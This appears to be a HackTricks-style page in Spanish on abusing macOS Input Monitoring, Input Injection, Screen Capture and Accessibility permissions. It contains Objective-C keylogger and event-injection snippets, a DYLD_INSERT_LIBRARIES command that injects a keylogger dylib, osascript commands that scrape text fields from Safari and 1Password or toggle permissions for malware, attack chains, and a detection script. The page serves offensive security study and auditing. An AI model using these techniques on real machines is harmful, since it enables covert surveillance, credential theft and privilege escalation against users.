# Abuso de Input Monitoring, Screen Capture y Accessibility en macOS

{{#include ../../../banners/hacktricks-training.md}}

## Visión general

Tres servicios TCC relacionados controlan cómo las aplicaciones pueden observar e interactuar con la sesión de escritorio del usuario:

| Servicio TCC | Permiso | Capacidad |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Leer todos los eventos de teclado y ratón a nivel del sistema (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Inyectar eventos sintéticos de teclado y ratón |
| `kTCCServiceScreenCapture` | **Screen Capture** | Leer el búfer de pantalla, tomar capturas de pantalla, grabar la pantalla |
| `kTCCServiceAccessibility` | **Accessibility** | Controlar otras aplicaciones vía AXUIElement API, leer elementos de la UI |

Estos permisos son **la combinación más peligrosa** en macOS — juntos proporcionan:
- Keylogging completo de cada pulsación (contraseñas, mensajes, tarjetas de crédito)
- Grabación de pantalla de todo el contenido visible
- Inyección de entrada sintética (hacer clic en botones, aprobar diálogos)
- Control completo de la GUI equivalente a acceso físico

---

## Input Monitoring (kTCCServiceListenEvent)

### Cómo funciona

macOS usa la **`CGEventTap` API** para permitir que los procesos intercepten eventos de entrada del sistema de eventos Quartz. Un proceso con permiso ListenEvent puede crear un event tap que recibe **cada evento de teclado y ratón** antes o después de que lleguen a la aplicación objetivo.
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Encontrar binarios con entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Ataque: Keylogging via Code Injection

Si un binario con ListenEvent permission también tiene **disabled library validation** o **allows DYLD environment variables**, un atacante puede inyectar un dylib que registre un CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
### Ataque: Credential Harvesting

El dylib inyectado hereda el ListenEvent TCC grant del target y captura todas las pulsaciones de teclas.

Un keylogger sofisticado puede correlacionar las pulsaciones de teclas con la aplicación activa:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Cómo funciona

La autorización PostEvent permite crear un event tap con **`kCGEventTapOptionDefault`** (puede modificar/inyectar eventos) en lugar de ListenOnly. Esto permite:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Ataque: Aprobación automatizada de solicitudes de TCC

Con PostEvent, un atacante puede **simular hacer clic en "Allow"** en los cuadros de diálogo de permisos de TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Captura de pantalla (kTCCServiceScreenCapture)

### Cómo funciona

El permiso de captura de pantalla permite leer el búfer de pantalla usando:
- **`CGWindowListCreateImage`** — capturar cualquier ventana o pantalla completa
- **`ScreenCaptureKit`** (macOS 12.3+) — API moderna para transmitir contenido de la pantalla
- **`CGDisplayStream`** — captura de pantalla acelerada por hardware
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Encontrar clientes de captura de pantalla
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Ataque: Credential Capture via OCR

Un proceso inyectado de captura de pantalla puede capturar fotogramas periódicamente y usar OCR para extraer contraseñas:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> A partir de **macOS Sonoma**, la captura de pantalla muestra un **indicador persistente** en la barra de menú. En versiones anteriores, la grabación de pantalla podía ser completamente silenciosa. Sin embargo, una captura breve de un solo fotograma aún puede pasar desapercibida para los usuarios.

### Ataque: Grabación de sesión

La grabación continua de pantalla proporciona una reproducción completa de la sesión del usuario:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accesibilidad (kTCCServiceAccessibility)

### Cómo funciona

El acceso de Accesibilidad otorga control sobre otras aplicaciones a través de la **AXUIElement API**. Un proceso con accesibilidad puede:

1. **Leer** cualquier elemento de la UI en cualquier aplicación (campos de texto, etiquetas, botones, menús)
2. **Hacer clic** en botones e interactuar con controles
3. **Escribir** texto en cualquier campo de texto
4. **Navegar** por menús y diálogos
5. **Extraer** datos mostrados de cualquier aplicación en ejecución
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

El abuso de accesibilidad más peligroso es **navegar por System Settings para otorgar permisos adicionales a tu propio malware**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Ataque: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Ataque: Acciones de usuario automatizadas
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Cadenas de ataque

### Cadena: Input Monitoring + Screen Capture = Vigilancia completa
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Cadena: Accessibility + PostEvent = Control remoto completo
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Cadena: Accessibility → Self-Grant Camera/Mic → Surveillance
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Detección y Enumeración
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Referencias

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objectivesee.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
